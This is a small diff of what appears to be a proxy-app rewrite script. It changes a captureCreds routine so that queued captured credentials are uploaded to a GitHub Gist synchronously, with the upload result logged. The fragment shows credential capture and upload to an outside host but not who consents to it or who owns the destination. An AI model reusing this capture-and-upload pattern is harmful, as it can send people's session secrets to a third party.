@@ -118,13 +118,13 @@ async function captureCreds() {
     }
 
     if (needUpdate) {
-        // 重写链路只排队，不访问 Gist，避免阻塞网络请求。
+        // 先入队，再在本次执行中完成同步，确保上传结果日志可见。
         queuePendingPayload(current, fp, nowSec, prioritySync);
-        syncPendingToGistNonBlocking();
+        await syncPendingToGistNonBlocking();
     }
 }
 
-function syncPendingToGistNonBlocking() {
+async function syncPendingToGistNonBlocking() {
     const nowSec = Math.floor(Date.now() / 1000);
     const lockTs = parseInt($.getdata(CONFIG.syncLockTsKey) || "0", 10) || 0;
     if (nowSec - lockTs < CONFIG.syncLockTtlSec) {
@@ -133,7 +133,7 @@ function syncPendingToGistNonBlocking() {
     }
 
     $.setdata(String(nowSec), CONFIG.syncLockTsKey);
-    syncPendingToGist().catch((e) => {
+    await syncPendingToGist().catch((e) => {
         console.log(`[${$.name}] 非阻塞同步失败: ${e}`);
     }).finally(() => {
         $.setdata("", CONFIG.syncLockTsKey);
